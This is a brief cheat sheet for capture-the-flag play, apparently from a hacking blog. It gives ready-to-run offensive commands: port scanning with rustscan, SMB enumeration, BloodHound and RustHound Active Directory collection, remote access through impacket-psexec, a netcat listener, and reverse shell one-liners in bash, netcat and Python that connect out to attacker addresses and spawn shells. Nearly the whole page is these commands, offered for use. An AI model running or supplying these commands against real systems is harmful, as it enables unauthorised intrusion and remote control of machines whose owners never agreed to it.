---
title: CTF Cheat Sheet
---

**Tagline:** *Everyday Hacks to Elite Attacks — Cyber Warfare. Ghost Ops. Red Team Tactics. HaxrByte.*

# CTF CheatSheet

* TOC
{:toc}

# PortScan

```bash
$ sudo rustscan -a <hostname> -- -sCV -oA <filename>
```

# SMB

```bash
$ smbclient -L //server -U username%password

$ smbclient //server/share -U username%password
```

# BloodHound

```bash
$ sudo ./bloodhound containers start
```

## RustHound

```bash
$ rusthound-ce --domain <domain_name> -u <username> -p <password>
```

# Remote Access

```bash
$ impacket-psexec <domain_name>/<username>:'<password>'@<target_ip>
```

# Web Server

```bash
$ python3 -m http.server 8080 -d directory
```

# Listener

```bash
rlwrap nc -nvlp 1337

rlwrap will enhance the shell, allowing you to clear the screen with [CTRL] + [L].
```

# Reverse Shell

```bash
'bash -c "bash -i >& /dev/tcp/1.2.3.4/1337 0>&1"'

python3 -c 'import pty;pty.spawn("/bin/bash")'

nc -e /bin/sh 10.0.0.1 1234
```
